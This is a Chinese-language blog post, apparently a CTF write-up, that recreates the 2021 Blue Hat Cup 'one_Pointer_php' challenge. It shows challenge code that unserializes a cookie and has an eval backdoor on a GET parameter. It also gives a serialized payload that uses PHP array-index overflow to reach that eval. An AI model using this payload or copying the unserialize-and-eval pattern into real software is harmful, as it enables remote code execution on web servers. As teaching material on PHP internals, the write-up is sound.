@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="蓝帽杯2021复现one_Pointer_phpbuu上开了环境，真不错 user.php 12345&lt;?phpclass User&amp;#123;	public $count;&amp;#125;?&gt;   add_api.php 12345678910111213141516&lt;?phpinclude &quot;user.php&quot;;if($user&#x3D;unserialize($_C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蓝帽杯2021复现">
+<meta property="og:url" content="http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="inanb">
+<meta property="og:description" content="蓝帽杯2021复现one_Pointer_phpbuu上开了环境，真不错 user.php 12345&lt;?phpclass User&amp;#123;	public $count;&amp;#125;?&gt;   add_api.php 12345678910111213141516&lt;?phpinclude &quot;user.php&quot;;if($user&#x3D;unserialize($_C">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:/HexoBlog/source/images/蓝帽杯2021复现/image-20210508181911478.png">
+<meta property="og:image" content="http://example.com/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png">
+<meta property="og:image" content="http://example.com/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png">
+<meta property="og:image" content="http://example.com/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png">
+<meta property="og:image" content="http://example.com/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png">
+<meta property="article:published_time" content="2021-05-08T09:28:24.000Z">
+<meta property="article:modified_time" content="2021-05-13T09:01:10.038Z">
+<meta property="article:author" content="inanb">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/HexoBlog/source/images/蓝帽杯2021复现/image-20210508181911478.png">
+
+<link rel="canonical" href="http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>蓝帽杯2021复现 | inanb</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="inanb" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">inanb</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">昨夜雨疏风骤 浓睡不消残酒</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/08/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="inanb">
+      <meta itemprop="description" content="铁马冰河入梦来">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="inanb">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          蓝帽杯2021复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-08 17:28:24" itemprop="dateCreated datePublished" datetime="2021-05-08T17:28:24+08:00">2021-05-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-13 17:01:10" itemprop="dateModified" datetime="2021-05-13T17:01:10+08:00">2021-05-13</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="蓝帽杯2021复现"><a href="#蓝帽杯2021复现" class="headerlink" title="蓝帽杯2021复现"></a>蓝帽杯2021复现</h3><h4 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h4><p>buu上开了环境，真不错</p>
+<p>user.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>add_api.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就两个文件……</p>
+<p>当时看了半天，就只知道要绕过<code>if($count[]=1)</code>……可这玩意不是恒对的吗……</p>
+<p>这关系到php的索引数组溢出</p>
+<h5 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43821278/article/details/114763459">https://blog.csdn.net/weixin_43821278/article/details/114763459</a></p>
+<p>根据这篇文章的实验</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php 5.59nts</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a[<span class="number">2147483647</span>]=<span class="string">&quot;ccc&quot;</span>;</span><br><span class="line">$a[]=<span class="string">&quot;bbb&quot;</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<p><img src="D:\HexoBlog\source\images\蓝帽杯2021复现\image-20210508181911478.png" alt="image-20210508181911478"></p>
+<blockquote>
+<p>$a[]访问到的是当前最大数值索引的下一位</p>
+</blockquote>
+<p>也就是说，在5.5.9nts版本下，2147483647就是数值索引的界限，而2147483647正是5.5.9版本中默认设置的整型最大值：<code>PHP_INT_MAX:int(2147483647)</code>。</p>
+<p>这里的int，是<strong>有符号32位二进制可表示的最大数</strong>。</p>
+<blockquote>
+<p><strong>2^31-1</strong>=<strong>2147483647</strong></p>
+</blockquote>
+<p>如果超过了呢？</p>
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165829865.png" alt="image-20210513165829865"></p>
+<p>这里会转化为范围更大的float储存……</p>
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165839374.png" alt="image-20210513165839374"></p>
+<p>数组中溢出后就会回滚从int的最小值，于是会符合这样的规律：</p>
+<blockquote>
+<p>0—2147483647                       下标0~2147483647 </p>
+<p>2147483648—4294967296   下标-2147483648~0 </p>
+<p>4294967296—6442450943   下标 0~2147483647</p>
+<p>下一个溢出为0的数字是：8589934592</p>
+</blockquote>
+<p>这样使用似乎没什么问题，但如果是通过<code>$a[]</code>去获取就会产生报错，相关版本的题目是<code>XCTF-favorite_number</code>，可以研究研究。</p>
+<h5 id="较新的版本"><a href="#较新的版本" class="headerlink" title="较新的版本"></a>较新的版本</h5><p>这里是7.3.4nts的php版本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MAX：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MIN：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_SIZE：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_SIZE);</span><br><span class="line"></span><br><span class="line">$a =<span class="number">9223372036854775806</span>;</span><br><span class="line">$b =<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_int：&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_float：&quot;</span>;</span><br><span class="line">var_dump(is_float($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br><span class="line">PHP_INT_MAX：int(9223372036854775807)</span><br><span class="line">PHP_INT_MIN：int(-9223372036854775808)</span><br><span class="line">PHP_INT_SIZE：int(8)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">is_int：bool(false)</span><br><span class="line">is_float：bool(true)</span><br><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br><span class="line">9.2233720368548E+18</span><br></pre></td></tr></table></figure>
+
+<p>同样会转化为float而不再属于整型，并会以科学计数法输出</p>
+<p>这里的“int”，是<strong>有符号64位二进制可表示的最大数</strong>，或者说，我们更加熟悉的<strong>long long int</strong>。</p>
+<blockquote>
+<p><strong>2^63-1</strong>=<strong>9223372036854775807</strong></p>
+</blockquote>
+<p>较新的版本大概是提高了索引溢出的阈值……</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a[<span class="number">9223372036854775806</span>]=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png" alt="image-20210513165907924"></p>
+<p>最后的语句成功报错，根据这个方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">		$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$user=<span class="keyword">new</span> User;</span><br><span class="line">	$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =<span class="keyword">new</span> User();</span><br><span class="line">$a -&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line">$a =urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以成功绕过赋值判断</p>
+<blockquote>
+<p>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</p>
+</blockquote>
+<p>执行命令，来phpinfo看看敏感信息：</p>
+<p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png" alt="image-20210513165922744"></p>
+<p>……上一个绕过<strong>disable_function</strong>的还是so劫持或者蚁剑插件……不是很会……</p>
+<p>看了dalao的wp，一直搞不好……原理倒是看了七七八八……</p>
+<p>然后……没有然后了……蹲一个好大佬的wp😢</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/05/06/hacker101-2/" rel="prev" title="hacker101-2">
+      <i class="fa fa-chevron-left"></i> hacker101-2
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/05/12/%E6%B4%A5%E9%97%A8%E6%9D%AFGoOSS/" rel="next" title="津门杯GoOSS">
+      津门杯GoOSS <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">蓝帽杯2021复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#one-Pointer-php"><span class="nav-number">1.1.</span> <span class="nav-text">one_Pointer_php</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP%E6%95%B0%E7%BB%84"><span class="nav-number">1.1.1.</span> <span class="nav-text">PHP数组</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BE%83%E6%96%B0%E7%9A%84%E7%89%88%E6%9C%AC"><span class="nav-number">1.1.2.</span> <span class="nav-text">较新的版本</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="inanb"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">inanb</p>
+  <div class="site-description" itemprop="description">铁马冰河入梦来</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">92</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fas fa-rss fa-fw"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">inanb</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
